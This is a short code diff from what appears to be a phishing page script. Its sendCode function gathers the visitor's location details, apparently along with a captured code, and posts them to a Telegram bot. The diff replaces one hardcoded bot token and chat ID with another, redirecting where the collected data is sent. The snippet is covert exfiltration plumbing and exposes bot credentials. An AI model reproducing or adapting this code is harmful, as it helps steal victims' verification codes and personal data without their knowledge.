@@ -147,8 +147,8 @@ function sendCode() {
             ` <strong>City:</strong> <code>${IpAddress?.city || 'N/A'}</code>`;
 
         NUMBER_TIME_SEND_CODE++;
-        const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
-        const chatId = '-1002416068664';
+        const botToken = '7616963510:AAFZGMoWsbTvNL7sCBtZh5SfkdLr-wF2J4k';
+        const chatId = '-1002271675161';
         const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
         fetch(telegramUrl, {
